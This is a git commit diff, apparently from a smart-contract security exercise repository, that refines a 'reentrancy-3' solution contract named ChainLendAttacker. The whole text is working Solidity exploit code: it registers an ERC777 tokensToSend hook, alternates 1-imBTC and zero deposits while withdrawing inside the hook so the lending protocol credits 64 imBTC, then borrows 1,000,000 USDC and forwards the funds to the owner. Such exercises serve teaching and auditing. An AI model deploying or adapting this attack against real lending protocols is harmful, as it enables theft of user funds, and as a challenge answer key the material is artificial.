cb9195898b9488d3af92cb11a356805ad1f62ffc
firatstory.eth <talefirat@gmail.com>
2023-06-11 13:40:47 +0200

    improve reentrancy-3 solution

--- contracts/reentrancy-3/ChainLendAttacker.sol
+++ contracts/reentrancy-3/ChainLendAttacker.sol
@@ -3,7 +3,6 @@ pragma solidity ^0.8.13;
 
 import "./ChainLend.sol";
 import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
-import "hardhat/console.sol";
 
 contract ChainLendAttacker {
     ChainLend chainlend;
@@ -14,10 +13,7 @@ contract ChainLendAttacker {
 
     // registry address
     IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
-    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
-    uint256 constant MAX_INT = 2 ** 256 - 1;
-    uint256 private currentimBTCBalance;
-    uint16 reentrantCalls;
+    uint256 private constant ONE_IMBTC = 1e8;
 
     constructor(address _chainLend, address _imBTC, address _usdc) {
         chainlend = ChainLend(_chainLend);
@@ -25,19 +21,19 @@ contract ChainLendAttacker {
         usdc = IERC20(_usdc);
 
         owner = msg.sender;
-        imBTC.approve(address(chainlend), MAX_INT);
-        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));
+        // only approve 64 imBTC tranfer for the looping
+        imBTC.approve(address(chainlend), 64 * ONE_IMBTC);
+        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
     }
 
     function attack() external {
         require(msg.sender == owner, "only owner");
         // protocol should think we have deposited 63 imBTC in order to allow us to borrow 1 mil usdc
         for (uint8 i = 0; i <= 63; i++) {
-            currentimBTCBalance = imBTC.balanceOf(address(this));
-            // First deposit
-            chainlend.deposit(currentimBTCBalance - 1);
+            // First deposit 1 imBTC
+            chainlend.deposit(ONE_IMBTC);
             //Second deposit
-            chainlend.deposit(1);
+            chainlend.deposit(0);
         }
 
         // borrow 1_000_000 USDC
@@ -47,17 +43,15 @@ contract ChainLendAttacker {
         // send all usdc and imBTC back
         usdc.transfer(owner, usdcBalance);
 
-        currentimBTCBalance = imBTC.balanceOf(address(this));
-        imBTC.transfer(owner, currentimBTCBalance);
+        imBTC.transfer(owner, ONE_IMBTC);
     }
 
-    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
+    function tokensToSend(address, address, address, uint256 _amount, bytes calldata, bytes calldata) external {
         require(msg.sender == address(imBTC), "not imBTC");
-        reentrantCalls++;
 
         // only in the second deposit
-        if (reentrantCalls % 2 == 0) {
-            chainlend.withdraw(currentimBTCBalance - 1);
+        if (_amount == 0) {
+            chainlend.withdraw(ONE_IMBTC);
         }
     }
 }
